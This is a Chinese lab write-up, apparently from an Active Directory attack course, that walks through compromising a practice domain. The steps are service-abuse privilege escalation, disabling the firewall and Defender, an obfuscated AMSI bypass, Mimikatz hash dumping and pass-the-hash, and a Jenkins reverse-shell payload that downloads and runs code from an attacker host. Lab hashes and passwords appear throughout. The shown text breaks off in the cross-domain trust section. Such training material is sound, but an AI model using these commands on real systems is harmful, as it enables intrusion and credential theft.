目标是在所有计算机内执行命令（不包括学生机器）

# 基本域信息枚举
当前域：
```
PS C:\ad> Get-NetDomain


Forest                  : moneycorp.local
DomainControllers       : {dcorp-dc.dollarcorp.moneycorp.local}
Children                : {us.dollarcorp.moneycorp.local}
DomainMode              : Unknown
DomainModeLevel         : 7
Parent                  : moneycorp.local
PdcRoleOwner            : dcorp-dc.dollarcorp.moneycorp.local
RidRoleOwner            : dcorp-dc.dollarcorp.moneycorp.local
InfrastructureRoleOwner : dcorp-dc.dollarcorp.moneycorp.local
Name                    : dollarcorp.moneycorp.local
```


当前森林内所有域
```

PS C:\ad> Get-NetForestDomain -Forest  moneycorp.local


Forest                  : moneycorp.local
DomainControllers       : {dcorp-dc.dollarcorp.moneycorp.local}
Children                : {us.dollarcorp.moneycorp.local}
DomainMode              : Unknown
DomainModeLevel         : 7
Parent                  : moneycorp.local
PdcRoleOwner            : dcorp-dc.dollarcorp.moneycorp.local
RidRoleOwner            : dcorp-dc.dollarcorp.moneycorp.local
InfrastructureRoleOwner : dcorp-dc.dollarcorp.moneycorp.local
Name                    : dollarcorp.moneycorp.local

Forest                  : moneycorp.local
DomainControllers       : {mcorp-dc.moneycorp.local}
Children                : {dollarcorp.moneycorp.local}
DomainMode              : Unknown
DomainModeLevel         : 7
Parent                  :
PdcRoleOwner            : mcorp-dc.moneycorp.local
RidRoleOwner            : mcorp-dc.moneycorp.local
InfrastructureRoleOwner : mcorp-dc.moneycorp.local
Name                    : moneycorp.local

Forest                  :
DomainControllers       :
Children                :
DomainMode              :
DomainModeLevel         :
Parent                  :
PdcRoleOwner            :
RidRoleOwner            :
InfrastructureRoleOwner :
Name                    : us.dollarcorp.moneycorp.local
```

父域：moneycorp.local
父域DC：mcorp-dc.moneycorp.local

当前域：dollarcorp.moneycorp.local
当前域DC:dcorp-dc.dollarcorp.moneycorp.local

子域：us.dollarcorp.moneycorp.local


枚举当前域所有计算机列表
```
PS C:\ad> Get-NetComputer
dcorp-dc.dollarcorp.moneycorp.local
dcorp-mgmt.dollarcorp.moneycorp.local
dcorp-ci.dollarcorp.moneycorp.local
dcorp-mssql.dollarcorp.moneycorp.local
dcorp-adminsrv.dollarcorp.moneycorp.local
dcorp-appsrv.dollarcorp.moneycorp.local
dcorp-sql1.dollarcorp.moneycorp.local
dcorp-stdadm.dollarcorp.moneycorp.local
<省略学生机器>
```

当前域所有用户
```
PS C:\ad> Get-NetUser|select cn

cn
--
Administrator
Guest
DefaultAccount
krbtgt
ci admin
sql admin
web svc
srv admin
app admin
mgmt admin
svc admin
studentadmin
sql1 admin
test da
Control359User
Control360User
Control361User
Control362User
Control363User
Control364User
Control365User
Control366User
Control367User
Control368User
Control369User
Control370User
Support359User
Support360User
Support361User
Support362User
Support363User
Support364User
Support365User
Support366User
Support367User
Support368User
Support369User
Support370User
<省略学生机器>
```

枚举域中所有用户组
```

PS C:\ad> Get-NetGroup
Administrators
Users
Guests
Print Operators
Backup Operators
Replicator
Remote Desktop Users
Network Configuration Operators
Performance Monitor Users
Performance Log Users
Distributed COM Users
IIS_IUSRS
Cryptographic Operators
Event Log Readers
Certificate Service DCOM Access
RDS Remote Access Servers
RDS Endpoint Servers
RDS Management Servers
Hyper-V Administrators
Access Control Assistance Operators
Remote Management Users
System Managed Accounts Group
Storage Replica Administrators
Domain Computers
Domain Controllers
Cert Publishers
Domain Admins
Domain Users
Domain Guests
Group Policy Creator Owners
RAS and IAS Servers
Server Operators
Account Operators
Pre-Windows 2000 Compatible Access
Windows Authorization Access Group
Terminal Server License Servers
Allowed RODC Password Replication Group
Denied RODC Password Replication Group
Read-only Domain Controllers
Cloneable Domain Controllers
Protected Users
Key Admins
DnsAdmins
DnsUpdateProxy
RDPUsers
```

枚举所有域管理员信息
```
PS C:\ad> Get-NetGroupMember -GroupName "Domain Admins" -Recurse


GroupDomain  : dollarcorp.moneycorp.local
GroupName    : Domain Admins
MemberDomain : dollarcorp.moneycorp.local
MemberName   : svcadmin
MemberSID    : S-1-5-21-1874506631-3219952063-538504511-1122
IsGroup      : False
MemberDN     : CN=svc admin,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local

GroupDomain  : dollarcorp.moneycorp.local
GroupName    : Domain Admins
MemberDomain : dollarcorp.moneycorp.local
MemberName   : Administrator
MemberSID    : S-1-5-21-1874506631-3219952063-538504511-500
IsGroup      : False
MemberDN     : CN=Administrator,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
```

一共两个域管理员，这两个要重点关注。
```
svcadmin
Administrator
```

# 本地权限提升

引入powerup，全面检查漏洞情况
```
PS C:\ad> . .\PowerUp.ps1
PS C:\ad> Invoke-AllChecks
```

发现有两个可以修改的服务
```
[*] Checking service permissions...


ServiceName   : AbyssWebServer
Path          : C:\WebServer\Abyss Web Server\WebServer\abyssws.exe --service
StartName     : LocalSystem
AbuseFunction : Invoke-ServiceAbuse -Name 'AbyssWebServer'
CanRestart    : True

ServiceName   : SNMPTRAP
Path          : C:\Windows\System32\snmptrap.exe
StartName     : LocalSystem
AbuseFunction : Invoke-ServiceAbuse -Name 'SNMPTRAP'
CanRestart    : True
```

选择SNMPTRAP进行权限提升
```
PS C:\ad> Invoke-ServiceAbuse -Name 'SNMPTRAP' -UserName 'dcorp\student366'
WARNING: Waiting for service 'SNMP Trap (SNMPTRAP)' to stop...
WARNING: Waiting for service 'SNMP Trap (SNMPTRAP)' to stop...

ServiceAbused Command
------------- -------
SNMPTRAP      net localgroup Administrators dcorp\student366 /add

```

然后以管理员身份打开一个powershell的新窗口，输入当前学生账号和密码，如果能打开，说明提权成功
```
PS C:\ad> whoami /all

USER INFORMATION
----------------

User Name        SID
================ ==============================================
dcorp\student366 S-1-5-21-1874506631-3219952063-538504511-45144


GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                           Attributes

========================================== ================ ============================================= ==============
=================================================
Everyone                                   Well-known group S-1-1-0                                       Mandatory grou
p, Enabled by default, Enabled group
BUILTIN\Remote Desktop Users               Alias            S-1-5-32-555                                  Mandatory grou
p, Enabled by default, Enabled group
BUILTIN\Administrators                     Alias            S-1-5-32-544                                  Mandatory grou
p, Enabled by default, Enabled group, Group owner
BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory grou
p, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE                   Well-known group S-1-5-4                                       Mandatory grou
p, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory grou
p, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory grou
p, Enabled by default, Enabled group
LOCAL                                      Well-known group S-1-2-0                                       Mandatory grou
p, Enabled by default, Enabled group
dcorp\RDPUsers                             Group            S-1-5-21-1874506631-3219952063-538504511-1116 Mandatory grou
p, Enabled by default, Enabled group
Authentication authority asserted identity Well-known group S-1-18-1                                      Mandatory grou
p, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288

```

可以看到我们已经在本地Administrators组

# 关闭防火墙和windefend

查看当前防火墙状态
```
PS C:\ad> netsh advfirewall show currentprofile

Domain Profile Settings:
----------------------------------------------------------------------
State                                 ON
Firewall Policy                       BlockInbound,AllowOutbound
LocalFirewallRules                    N/A (GPO-store only)
LocalConSecRules                      N/A (GPO-store only)
InboundUserNotification               Disable
RemoteManagement                      Disable
UnicastResponseToMulticast            Enable

Logging:
LogAllowedConnections                 Disable
LogDroppedConnections                 Disable
FileName                              %systemroot%\system32\LogFiles\Firewall\pfirewall.log
MaxFileSize                           4096

Ok.
```

关闭防火墙
```
PS C:\ad> NetSh Advfirewall set allprofiles state off
Ok.
```

再次查看防火墙状态,已成功关闭
```
PS C:\ad> netsh advfirewall show currentprofile

Domain Profile Settings:
----------------------------------------------------------------------
State                                 OFF
Firewall Policy                       BlockInbound,AllowOutbound
LocalFirewallRules                    N/A (GPO-store only)
LocalConSecRules                      N/A (GPO-store only)
InboundUserNotification               Disable
RemoteManagement                      Disable
UnicastResponseToMulticast            Enable

Logging:
LogAllowedConnections                 Disable
LogDroppedConnections                 Disable
FileName                              %systemroot%\system32\LogFiles\Firewall\pfirewall.log
MaxFileSize                           4096

Ok.
```

查看WinDefend状态，显示Running
```
PS C:\ad> Get-Service WinDefend

Status   Name               DisplayName
------   ----               -----------
Running  WinDefend          Windows Defender Service
```

以管理员身份运行下面powershll命令：
```reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpywar" /d 1 /t REG_DWORD```

重启计算机
```
Restart-Computer
```

如果显示还是没有关掉，那就手动去关一下。。

# bloodhold

部署过程参考walkthrough1

参考bloodhold收集的结果，最快到达DA的路径是：
当前用户（student366）在RDPUsers组，可以以本地管理员的身份横向到计算机dcorp-adminsrv

dcorp-adminsrv和域控服务器dcorp-dc存在某种约束条件（Delegate）,可以加以利用

域控服务器dcorp-dc有域管理员的登录session

# 域权限提升
查看可以以本地管理员登录的计算机
```
PS C:\ad> . .\Find-PSRemotingLocalAdminAccess.ps1
PS C:\ad> Find-PSRemotingLocalAdminAccess
dcorp-adminsrv
dcorp-std366
```

横向到dcorp-adminsrv
```
Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local
```

可以bypass powershell policy，但是不能bypass AMSI，会报错
```
[dcorp-adminsrv]: PS C:\Users\student366\Documents> S`eT-It`em ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) ([TYpE]
( "{1}{0}"-F'F','rE' ) ) ; ( Get-varI`A`BLE (('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(("{6}{3}{1}{4}{2}{0}{5}
" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em') ) )."g`etf`iElD"( ( "{0
}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile') ),( "{2}{4}{0}{1}{3}" -f('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' ))."s
E`T`VaLUE"( ${n`ULl},${t`RuE} )
Cannot invoke method. Method invocation is supported only on core types in this language mode.
At line:1 char:96
+ ... ,'rE' ) ) ; ( Get-varI`A`BLE (('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly" ...
+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException
    + FullyQualifiedErrorId : MethodInvocationNotSupportedInConstrainedLanguage
```

枚举所有AppLocker策略
```
[dcorp-adminsrv]: PS C:\Users\student366\Documents> Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollecti
ons


PublisherConditions : {*\O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US\*,*}
PublisherExceptions : {}
PathExceptions      : {}
HashExceptions      : {}
Id                  : 5a9340f3-f6a7-4892-84ac-0fffd51d9584
Name                : Signed by O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US
Description         :
UserOrGroupSid      : S-1-1-0
Action              : Allow

PublisherConditions : {*\O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US\*,*}
PublisherExceptions : {}
PathExceptions      : {}
HashExceptions      : {}
Id                  : 10541a9a-69a9-44e2-a2da-5538234e1ebc
Name                : Signed by O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US
Description         :
UserOrGroupSid      : S-1-1-0
Action              : Allow

PathConditions      : {%PROGRAMFILES%\*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : 06dce67b-934c-454f-a263-2515c8796a5d
Name                : (Default Rule) All scripts located in the Program Files folder
Description         : Allows members of the Everyone group to run scripts that are located in the Program Files folder.
UserOrGroupSid      : S-1-1-0
Action              : Allow

PathConditions      : {%WINDIR%\*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : 9428c672-5fc3-47f4-808a-a0011f36dd2c
Name                : (Default Rule) All scripts located in the Windows folder
Description         : Allows members of the Everyone group to run scripts that are located in the Windows folder.
UserOrGroupSid      : S-1-1-0
Action              : Allow
```

留意最后两条，所以脚本只可以在```{%PROGRAMFILES%\*}```和```{%WINDIR%\*}```下执行

把脚本拷贝到 \\dcorp-adminsrv\Program Files
```
 PS C:\ad> copy Invoke-Mimikatz.ps1 \\dcorp-adminsrv\c$\"Program Files"
PS C:\ad> ls \\dcorp-adminsrv\c$\"Program Files"


    Directory: \\dcorp-adminsrv\c$\Program Files


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        7/16/2016   6:18 AM                Common Files
d-----        7/16/2016   6:18 AM                internet explorer
d-----        8/20/2020   3:48 AM                Windows Defender
d-----        7/16/2016   6:18 AM                WindowsPowerShell
-a----        5/18/2021   6:59 PM        2530060 Invoke-Mimikatz.ps1
```

然而还是不能引入Mimikatz，会报错
```
[dcorp-adminsrv.dollarcorp.moneycorp.local]: PS C:\Program Files> . .\Invoke-Mimikatz.ps1
C:\Program Files\Invoke-Mimikatz.ps1 : Cannot dot-source this command because it was defined in a different language mode. To invoke this command without importing its contents, omit the '.' operator.
At line:1 char:1
+ . .\Invoke-Mimikatz.ps1
+ ~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidOperation: (:) [Invoke-Mimikatz.ps1], NotSupportedException
    + FullyQualifiedErrorId : DotSourceNotSupported,Invoke-Mimikatz.ps1
```

这里是因为开启了Constrained Language Mode，CLM，就算能把脚本拷贝到靶机，我们也不能执行。

在dcorp-adminsrv关闭Windows Defender
```
[dcorp-adminsrv.dollarcorp.moneycorp.local]: PS C:\Program Files> Set-MpPreference -DisableRealtimeMonitoring $true -Verbose
VERBOSE: Performing operation 'Update MSFT_MpPreference' on Target 'ProtectionManagement'.
```

## script调用自己

方法：
1. 复制一份Invoke-Mimikatz.ps1，取名为：Invoke-Mimikatz2.ps1
2. 在Invoke-Mimikatz2.ps1文件的最底部，加一行命令：Invoke-Mimikatz  #其实就是调用自己


把修改好的脚本拷贝到dcorp-adminsrv，注意根据上面的Applocker策略，只可以放在Program Files文件夹
```
Copy-Item .\Invoke-Mimikatz2.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files'
```

回到dcorp-adminsrv，不要把Invoke-Mimikatz2.ps1引入内存，而是直接执行，因为上面在拷贝那里加了一行Invoke-Mimikatz，所以会导出所有哈希

```
[dcorp-adminsrv.dollarcorp.moneycorp.local]: PS C:\Program Files> .\Invoke-Mimikatz2.ps1

  .#####.   mimikatz 2.1.1 (x64) built on Nov 29 2018 12:37:56
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(powershell) # sekurlsa::logonpasswords

Authentication Id : 0 ; 166214 (00000000:00028946)
Session           : RemoteInteractive from 2
User Name         : srvadmin
Domain            : dcorp
Logon Server      : DCORP-DC
Logon Time        : 11/26/2020 8:43:30 AM
SID               : S-1-5-21-1874506631-3219952063-538504511-1115
        msv :
         [00000003] Primary
         * Username : srvadmin
         * Domain   : dcorp
         * NTLM     : a98e18228819e8eec3dfa33cb68b0728
         * SHA1     : f613d1bede9a620ba16ae786e242d3027809c82a
         * DPAPI    : ddce77eab64944efda38b5cfdad5395f
        tspkg :
        wdigest :
         * Username : srvadmin
         * Domain   : dcorp
         * Password : (null)
        kerberos :
         * Username : srvadmin
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 67126 (00000000:00010636)
Session           : Service from 0
User Name         : appadmin
Domain            : dcorp
Logon Server      : DCORP-DC
Logon Time        : 11/26/2020 8:41:26 AM
SID               : S-1-5-21-1874506631-3219952063-538504511-1117
        msv :
         [00000003] Primary
         * Username : appadmin
         * Domain   : dcorp
         * NTLM     : d549831a955fee51a43c83efb3928fa7
         * SHA1     : 07de541a289d45a577f68c512c304dfcbf9e4816
         * DPAPI    : 7ec84538f109f73066103b9d1629f95e
        tspkg :
        wdigest :
         * Username : appadmin
         * Domain   : dcorp
         * Password : (null)
        kerberos :
         * Username : appadmin
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : *ActuallyTheWebServer1
        ssp :
        credman :

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : DCORP-ADMINSRV$
Domain            : dcorp
Logon Server      : (null)
Logon Time        : 11/26/2020 8:41:23 AM
SID               : S-1-5-20
        msv :
         [00000003] Primary
         * Username : DCORP-ADMINSRV$
         * Domain   : dcorp
         * NTLM     : 5e77978a734e3a7f3895fb0fdbda3b96
         * SHA1     : e9f3e1343aff21e696b7b7ecc72286aa451c067f
        tspkg :
        wdigest :
         * Username : DCORP-ADMINSRV$
         * Domain   : dcorp
         * Password : (null)
        kerberos :
         * Username : dcorp-adminsrv$
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 21719 (00000000:000054d7)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 11/26/2020 8:41:22 AM
SID               :
        msv :
         [00000003] Primary
         * Username : DCORP-ADMINSRV$
         * Domain   : dcorp
         * NTLM     : 5e77978a734e3a7f3895fb0fdbda3b96
         * SHA1     : e9f3e1343aff21e696b7b7ecc72286aa451c067f
        tspkg :
        wdigest :
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 66422 (00000000:00010376)
Session           : Service from 0
User Name         : websvc
Domain            : dcorp
Logon Server      : DCORP-DC
Logon Time        : 11/26/2020 8:41:26 AM
SID               : S-1-5-21-1874506631-3219952063-538504511-1113
        msv :
         [00000003] Primary
         * Username : websvc
         * Domain   : dcorp
         * NTLM     : cc098f204c5887eaa8253e7c2749156f
         * SHA1     : 36f2455c767ac9945fdc7cd276479a6a011e154b
         * DPAPI    : 65e0a67c32db3788515ff56e9348e99c
        tspkg :
        wdigest :
         * Username : websvc
         * Domain   : dcorp
         * Password : (null)
        kerberos :
         * Username : websvc
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : AServicewhichIsNotM3@nttoBe
        ssp :
        credman :

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 11/26/2020 8:41:23 AM
SID               : S-1-5-19
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : DCORP-ADMINSRV$
Domain            : dcorp
Logon Server      : (null)
Logon Time        : 11/26/2020 8:41:22 AM
SID               : S-1-5-18
        msv :
        tspkg :
        wdigest :
         * Username : DCORP-ADMINSRV$
         * Domain   : dcorp
         * Password : (null)
        kerberos :
         * Username : dcorp-adminsrv$
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : (null)
        ssp :
        credman :

mimikatz(powershell) # exit
Bye!
```

收集到的哈希信息：
```
srvadmin：a98e18228819e8eec3dfa33cb68b0728
appadmin：d549831a955fee51a43c83efb3928fa7
dcorp-adminsrv$：5e77978a734e3a7f3895fb0fdbda3b96
websvc：cc098f204c5887eaa8253e7c2749156f
```
这里注意srvadmin不是DA组成员

DA成员应该是svcadmin

查看当前权限账号可以以本地管理员登录的计算机
```
PS C:\ad> . .\Find-PSRemotingLocalAdminAccess.ps1
PS C:\ad> Find-PSRemotingLocalAdminAccess
dcorp-adminsrv
dcorp-mgmt
```

这次多了一个dcorp-mgmt

尝试在dcorp-mgmt中执行命令
```
PS C:\ad> Invoke-Command -ScriptBlock {whoami;hostname} -ComputerName dcorp-mgmt
dcorp\srvadmin
dcorp-mgmt
```


# jenkins!

在```http://172.16.3.11:8080/```运行了一个jenkins!程序

jenkin!这个web app在未登陆的情况下，可以通过下面页面查看有什么账号
```http://172.16.3.11:8080/asynchPeople/```

收集到三个用户名
```
builduser
jenkinsadmin
manager
```

经手工测试```builduser：builduser```登录进去以后可以编辑一个RCE

payload
```
powershell.exe iex (iwr http://172.16.100.66/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress 172.16.100.66 -Port 443
```

powercat监听
```
PS C:\ad> powercat -l -v -p 443 -t 100
VERBOSE: Set Stream 1: TCP
VERBOSE: Set Stream 2: Console
VERBOSE: Setting up Stream 1...
VERBOSE: Listening on [0.0.0.0] (port 443)
VERBOSE: Connection from [172.16.3.11] port  [tcp] accepted (source port 50288)
VERBOSE: Setting up Stream 2...
VERBOSE: Both Communication Streams Established. Redirecting Data Between Streams...

Windows PowerShell running as user ciadmin on DCORP-CI
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Program Files (x86)\Jenkins\workspace\project1>PS C:\Program Files (x86)\Jenkins\workspace\project1> whoami
dcorp\ciadmin
PS C:\Program Files (x86)\Jenkins\workspace\project1> hostname
dcorp-ci
```

收到一个反弹shell

bypass powershell和AMSI

远程加载Mimikatz和powerview
```
iex (iwr http://172.16.100.66/Invoke-Mimikatz.ps1 -UseBasicParsing)

iex (iwr http://172.16.100.66/PowerView.ps1 -UseBasicParsing)
```

先收集dcorp-ci的域用户NTML
执行：Invoke-Mimikatz

收集到的哈希信息：
```
ciadmin：e08253add90dccf1a208523d02998c3d
DCORP-CI$：bc7c774ae1c2f9325adee16ff86681fc
```

打开一个ciadmin权限的shell
```
Invoke-Mimikatz -Command '"sekurlsa::pth /user:ciadmin /domain:dollarcorp.moneycorp.local /ntlm:e08253add90dccf1a208523d02998c3d /run:powershell.exe"'
```


查找可以横向的计算机
```
PS C:\ad> Find-LocalAdminAccess
dcorp-mgmt.dollarcorp.moneycorp.local
dcorp-ci.dollarcorp.moneycorp.local
dcorp-std366.dollarcorp.moneycorp.local
```

可以横向到dcorp-mgmt，之前我们在dcorp\srvadmin下也可以横向到dcorp-mgmt

现在去dcorp-mgmt下看看会收集到什么信息

横向到dcorp-mgmt，bypass powershell policy和AMSI
```
PS C:\ad> Enter-PSSession dcorp-mgmt.dollarcorp.moneycorp.local
[dcorp-mgmt.dollarcorp.moneycorp.local]: PS C:\Users\ciadmin\Documents> powershell -ep bypass
Windows PowerShell
Copyright (C) 2016 Microsoft Corporation. All rights reserved.

PS C:\Users\ciadmin\Documents>
[dcorp-mgmt.dollarcorp.moneycorp.local]: PS C:\Users\ciadmin\Documents> S`eT-It`em ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') +
('uZ'+'x') ) ([TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( Get-varI`A`BLE (('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(("{
6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em') ) )
."g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile') ),( "{2}{4}{0}{1}{3}" -f('S'+'tat'),'i',('Non'+'Publ'
+'i'),'c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
```

远程载入mimikatz，dump出所有哈希
```
[dcorp-mgmt.dollarcorp.moneycorp.local]: PS C:\Users\ciadmin\Documents> iex (iwr http://172.16.100.66/Invoke-Mimikatz.ps1 -UseBasicParsing)
[dcorp-mgmt.dollarcorp.moneycorp.local]: PS C:\Users\ciadmin\Documents> Invoke-Mimikatz
```
dcorp-mgmt收集到的信息有：
```
DCORP-MGMT$:639c1adde3e0d1ba0d733c7d0d8f23ec
mgmtadmin:95e2cd7ff77379e34c6e46265e75d754
svcadmin:b38ff50264b74508085d82c69794a4d8
```

现在我们得到了svcadmin的NTML，svcadmin是DA组成员，我们已经成功提权到DA

用svcadmin的权限开一个shell
```
Invoke-Mimikatz -Command '"sekurlsa::pth /user:svcadmin /domain:dollarcorp.moneycorp.local /ntlm:b38ff50264b74508085d82c69794a4d8 /run:powershell.exe"'
```

查看svcadmin可以横向的计算机列表：
```
PS C:\ad> Find-LocalAdminAccess
dcorp-sql1.dollarcorp.moneycorp.local
dcorp-std370.dollarcorp.moneycorp.local
dcorp-std367.dollarcorp.moneycorp.local
dcorp-dc.dollarcorp.moneycorp.local
dcorp-stdadm.dollarcorp.moneycorp.local
dcorp-adminsrv.dollarcorp.moneycorp.local
dcorp-appsrv.dollarcorp.moneycorp.local
dcorp-std359.dollarcorp.moneycorp.local
dcorp-std361.dollarcorp.moneycorp.local
dcorp-std364.dollarcorp.moneycorp.local
dcorp-std360.dollarcorp.moneycorp.local
dcorp-std363.dollarcorp.moneycorp.local
dcorp-std366.dollarcorp.moneycorp.local
dcorp-mgmt.dollarcorp.moneycorp.local
dcorp-mssql.dollarcorp.moneycorp.local
dcorp-std368.dollarcorp.moneycorp.local
dcorp-std369.dollarcorp.moneycorp.local
dcorp-ci.dollarcorp.moneycorp.local
```

可以横向到DC服务器

```
Enter-PSSession dcorp-dc.dollarcorp.moneycorp.local
```

再次收集这台计算机上所有用户的NTML
```
[dcorp-dc.dollarcorp.moneycorp.local]: PS C:\Users\svcadmin\Documents> iex (iwr http://172.16.100.66/Invoke-Mimikatz.ps1
 -UseBasicParsing)
[dcorp-dc.dollarcorp.moneycorp.local]: PS C:\Users\svcadmin\Documents>  Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
```

收集到域用户信息有：
```
mimikatz(powershell) # lsadump::lsa /patch
Domain : dcorp / S-1-5-21-1874506631-3219952063-538504511

RID  : 000001f4 (500)
User : Administrator
LM   :
NTLM : af0686cc0ca8f04df42210c9ac980760

RID  : 000001f5 (501)
User : Guest
LM   :
NTLM :

RID  : 000001f6 (502)
User : krbtgt
LM   :
NTLM : ff46a9d8bd66c6efd77603da26796f35

RID  : 000001f7 (503)
User : DefaultAccount
LM   :
NTLM :

RID  : 00000455 (1109)
User : ciadmin
LM   :
NTLM : e08253add90dccf1a208523d02998c3d

RID  : 00000458 (1112)
User : sqladmin
LM   :
NTLM : 07e8be316e3da9a042a9cb681df19bf5

RID  : 00000459 (1113)
User : websvc
LM   :
NTLM : cc098f204c5887eaa8253e7c2749156f

RID  : 0000045b (1115)
User : srvadmin
LM   :
NTLM : a98e18228819e8eec3dfa33cb68b0728

RID  : 0000045d (1117)
User : appadmin
LM   :
NTLM : d549831a955fee51a43c83efb3928fa7

RID  : 00000461 (1121)
User : mgmtadmin
LM   :
NTLM : 95e2cd7ff77379e34c6e46265e75d754

RID  : 00000462 (1122)
User : svcadmin
LM   :
NTLM : b38ff50264b74508085d82c69794a4d8

RID  : 0000046b (1131)
User : studentadmin
LM   :
NTLM : d1254f303421d3cdbdc4c73a5bce0201

RID  : 00000470 (1136)
User : sql1admin
LM   :
NTLM : e999ae4bd06932620a1e78d2112138c6

RID  : 000004bb (1211)
User : testda
LM   :
NTLM : a16452f790729fa34e8f3a08f234a82c
<略>
```

这里会打印出域内所有用户和计算机的NTML信息，原则上我们现在可以访问到这个域里的所有计算机。


## 证明

打开一个域管理员Administrator的shell
```
Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:dollarcorp.moneycorp.local /ntlm:af0686cc0ca8f04df42210c9ac980760 /run:powershell.exe"'
```

查看允许横向的机器
```
PS C:\ad> . .\PowerView.ps1
PS C:\ad> Find-LocalAdminAccess
dcorp-std360.dollarcorp.moneycorp.local
dcorp-mssql.dollarcorp.moneycorp.local
dcorp-std368.dollarcorp.moneycorp.local
dcorp-appsrv.dollarcorp.moneycorp.local
dcorp-ci.dollarcorp.moneycorp.local
dcorp-mgmt.dollarcorp.moneycorp.local
dcorp-std361.dollarcorp.moneycorp.local
dcorp-std369.dollarcorp.moneycorp.local
dcorp-std366.dollarcorp.moneycorp.local
dcorp-dc.dollarcorp.moneycorp.local
dcorp-std363.dollarcorp.moneycorp.local
dcorp-sql1.dollarcorp.moneycorp.local
dcorp-std370.dollarcorp.moneycorp.local
dcorp-std364.dollarcorp.moneycorp.local
dcorp-std367.dollarcorp.moneycorp.local
dcorp-std359.dollarcorp.moneycorp.local
dcorp-stdadm.dollarcorp.moneycorp.local
dcorp-adminsrv.dollarcorp.moneycorp.local
```

在对应的机器里执行命令
```
PS C:\ad> Invoke-Command -ScriptBlock {whoami;hostname} -ComputerName dcorp-stdadm
dcorp\administrator
dcorp-stdadm
PS C:\ad> Invoke-Command -ScriptBlock {whoami;hostname} -ComputerName dcorp-adminsrv
dcorp\administrator
dcorp-adminsrv
PS C:\ad> Invoke-Command -ScriptBlock {whoami;hostname} -ComputerName dcorp-mssql
dcorp\administrator
dcorp-mssql
```


# 跨域攻击

继续使用dcorp\administrator的shell，枚举所有域信任关系
```
PS C:\ad> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dcorp-dc
```

返回了三个域信任信息

与父域MONEYCORP.LOCAL的信任信息
```
Domain: MONEYCORP.LOCAL (mcorp / S-1-5-21-280534878-1496970234-700767426)
 [  In ] DOLLARCORP.MONEYCORP.LOCAL -> MONEYCORP.LOCAL
